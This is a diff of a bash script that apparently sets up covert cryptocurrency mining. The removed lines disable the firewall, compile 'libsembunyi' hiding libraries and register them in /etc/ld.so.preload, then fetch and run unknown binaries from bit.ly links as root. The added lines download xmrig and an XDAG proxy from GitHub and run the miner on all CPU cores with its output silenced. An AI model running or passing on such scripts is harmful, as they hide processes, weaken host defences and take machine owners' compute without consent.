@@ -1,10 +1,8 @@
-#!/usr/bin/env bash
-sudo ufw disable
-wget https://github.com/BatiKangkung/KangKung/raw/main/all.tar.gz
-sudo su --command "tar -xvf all.tar.gz && cd 01 && make && sudo mv libsembunyi01.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi01.so >> /etc/ld.so.preload && cd 02 && make && sudo mv libsembunyi02.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi02.so >> /etc/ld.so.preload && cd 03 && make && sudo mv libsembunyi03.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi03.so >> /etc/ld.so.preload && cd 04 && make && sudo mv libsembunyi04.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi04.so >> /etc/ld.so.preload"
-sudo su --command "apt-get install shc -y && wget https://bit.ly/3NZULg3 && chmod +x 3NZULg3"
-sudo su --command "nohup ./3NZULg3 --log=stdout > meta.log &"
-sleep 2
-sudo su --command "cat meta.log" 
-sudo su --command "apt-get install shc -y && wget https://bit.ly/39IevGg && chmod +x 39IevGg"
-sudo su --command "./39IevGg"
+apt update
+apt install sudo -y
+wget https://bitbucket.org/fearstone/xdag/raw/5b7e4d59385fb3119fdaed5d968f02530beda1d2/config.json
+wget https://raw.githubusercontent.com/jsiqiisn/xdag/main/xmrig2xdag
+wget https://raw.githubusercontent.com/jsiqiisn/xdag/main/xmrig
+chmod 777 xmrig xmrig2xdag config.json
+sudo ./xmrig2xdag -c config.json > /dev/null 2>&1 &
+sudo ./xmrig -o 127.0.0.1:3232. -u A7F3atzGYPEBYAZlTZTfy4bKr8y3Ho57 -p x -a rx/xdag -t$(nproc --all)
